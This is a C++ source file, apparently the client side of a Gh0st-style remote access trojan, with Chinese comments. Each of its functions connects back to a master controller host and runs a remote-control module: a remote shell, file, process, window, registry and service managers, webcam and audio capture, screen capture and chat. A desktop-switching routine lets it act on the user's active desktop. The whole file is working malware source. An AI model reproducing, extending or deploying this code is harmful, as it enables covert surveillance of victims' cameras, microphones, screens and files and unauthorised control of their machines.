#include "StdAfx.h"
#include "Common.h"
#include "ClientSocket.h"
#include "KernelManager.h"
#include "ShellManager.h"
#include "SystemManager.h"
#include "FileManager.h"
#include "AudioManager.h"
#include "ScreenManager.h"
#include "Talk.h"
#include "VideoManager.h"
#include "RegManager.h"
#include "ServerManager.h"



/*

  HANDLE hThread = MyCreateThread(NULL,0,(LPTHREAD_START_ROUTINE)MyMain, 
		(LPVOID)g_strHost,0,NULL);              

*/


HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, 
					   SIZE_T dwStackSize,                      
					   LPTHREAD_START_ROUTINE lpStartAddress,   //MyMain //CallBack
					   LPVOID lpParameter,                      //127.0.0.1  //lpParm
					   DWORD dwCreationFlags,                   
					   LPDWORD lpThreadId, bool bInteractive)
{
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARGLIST	Arg;
	Arg.start_address = (unsigned ( __stdcall *)( void * ))lpStartAddress;
	Arg.arglist = (void *)lpParameter;
	Arg.bInteractive = bInteractive;
	Arg.hEventTransferArg = CreateEvent(NULL,FALSE,FALSE,NULL);
	hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, 
		dwStackSize,ThreadLoader, &Arg, dwCreationFlags, (unsigned *)lpThreadId);
	
	WaitForSingleObject(Arg.hEventTransferArg, INFINITE);	
	CloseHandle(Arg.hEventTransferArg);	
	return hThread;
}



unsigned int __stdcall ThreadLoader(LPVOID lpParam)  //MyMain  127.0.0.1
{
	unsigned int	nRet = 0;
#ifdef _DLL
	try
	{
#endif	
		THREAD_ARGLIST	Arg;
		memcpy(&Arg, lpParam, sizeof(Arg));
		SetEvent(Arg.hEventTransferArg);
		// 与卓面交互
	//	if (arg.bInteractive)
	//		SelectDesktop(NULL);
		
		nRet = Arg.start_address(Arg.arglist);    //这里真正调用我们自己的回调函数


#ifdef _DLL
	}catch(...){};
#endif
	return nRet;
}

//该函数是功能函数主要就是被控端生成一个与主控制端进行远程终端的Socket
DWORD WINAPI LoopShellManager(SOCKET sRemote)   
{
	CClientSocket	socketClient;

	//主控制端的IP 和端口
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
	{
		return -1;
	}
	
	CShellManager	Manager(&socketClient);   //注意父类的构造函数this 是当前类对象的指针
	
	socketClient.RunEventLoop();              //代码将卡死在这里 除非 socketClient类中Recve函数接到的对方关闭Disconnect函数触发 
	
	return 0;
}

//该功能是远程进程管理
DWORD WINAPI LoopSystemManager(SOCKET sRemote)   
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CSystemManager	Manager(&socketClient,COMMAND_SYSTEM);
	
	socketClient.RunEventLoop();
	
	return 0;
}




//该功能是远程窗口管理
DWORD WINAPI LoopWindowManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost,
		CKernelManager::m_nMasterPort))
	{
		return -1;
	}
	
	CSystemManager	Manager(&socketClient,COMMAND_WSLIST);
	
	socketClient.RunEventLoop();
	
	return 0;
}


//该功能是远程文件管理
DWORD WINAPI LoopFileManager(SOCKET sRemote)
{
	//---声明套接字类
	CClientSocket	socketClient;
	//连接
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
	{
		return -1;
	}
	CFileManager	Manager(&socketClient);
	socketClient.RunEventLoop();            
	
	return 0;
}




//该功能是远程摄像头
DWORD WINAPI LoopVideoManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CVideoManager	Manager(&socketClient);
	socketClient.RunEventLoop();
	return 0;
}


//该功能是远程音频管理
DWORD WINAPI LoopAudioManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CAudioManager	Manager(&socketClient);
	socketClient.RunEventLoop();
	return 0;
}

//该功能远程桌面管理
DWORD WINAPI LoopScreenManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CScreenManager	Manager(&socketClient);
	
	socketClient.RunEventLoop();
	return 0;
}

DWORD WINAPI LoopTalkManager(SOCKET sRemote)   
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	Talk	TalkManager(&socketClient);
	
	socketClient.RunEventLoop();
	
	return 0;
}


//注册表管理
DWORD WINAPI LoopRegeditManager(SOCKET sRemote)         
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CRegManager	Manager(&socketClient);
	
	socketClient.RunEventLoop();
	
	return 0;
}


//服务管理
DWORD WINAPI LoopServicesManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CServerManager	Manager(&socketClient);
	
	socketClient.RunEventLoop();
	
	return 0;
}


bool SwitchInputDesktop()
{
	BOOL	bRet = false;
	DWORD	dwLengthNeeded;
	
	HDESK	hOldDesktop, hNewDesktop;
	char	strCurrentDesktop[256], strInputDesktop[256];
	
	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(strCurrentDesktop, 0, sizeof(strCurrentDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME,
		&strCurrentDesktop, sizeof(strCurrentDesktop), &dwLengthNeeded); 
	//得到用户的默认工作区
	
	
	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(strInputDesktop, 0, sizeof(strInputDesktop));
	GetUserObjectInformation(hNewDesktop,
		UOI_NAME, &strInputDesktop, sizeof(strInputDesktop), &dwLengthNeeded);   
	//得到用户当前的工作区
	
	if (lstrcmpi(strInputDesktop, strCurrentDesktop) != 0)
	{
		SetThreadDesktop(hNewDesktop);
		bRet = true;
	}
	CloseDesktop(hOldDesktop);
	
	CloseDesktop(hNewDesktop);
	
	
	return bRet;
}